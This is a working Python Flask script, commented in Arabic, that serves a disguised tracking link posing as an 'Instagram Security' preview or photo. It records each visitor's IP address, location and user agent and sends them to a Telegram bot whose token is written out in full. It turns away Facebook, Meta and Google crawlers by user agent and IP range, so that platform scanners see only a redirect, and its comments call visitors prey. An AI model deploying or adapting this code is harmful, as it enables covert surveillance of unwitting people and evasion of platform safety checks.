from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- الإعدادات الأصلية حقك التي تعمل 100% ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg')
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ua_lower = user_agent.lower()

    # --- حظر IPs فيسبوك وبوتات الحماية (التي ظهرت في صورك) ---
    # هذا السطر هو "القناص" الذي يطرد الحماية ويترك الصيد الحقيقي
    protection_bots = ['facebook', 'meta', 'amazon', 'vercel', 'headless', 'bot', 'google']
    if any(b in ua_lower for b in protection_bots) or ip_address.startswith("66.220.") or ip_address.startswith("31.13."):
        return redirect("https://www.google.com")

    v_id = request.args.get('v', '100')

    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
    except:
        city = country = "N/A"

    # تمويه الرسالة لكي لا يكتشفها نظام فحص المحتوى في فيسبوك
    report = (
        f"✅ <b>New Access (v={v_id})</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>LOC:</b> {city}, {country}\n"
        f"📱 <b>UA:</b> {user_agent[:50]}...\n"
        f"--------------------------"
    )
    
    send_to_telegram(report)
    
    # التحويل السريع لإظهار المعاينة صمتاً
    return """
    <html>
    <head>
        <meta property="og:title" content="Instagram Security">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="video.other">
        <meta http-equiv="refresh" content="0; url=https://www.instagram.com">
    </head>
    <body onload="window.location.replace('https://www.instagram.com')"></body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
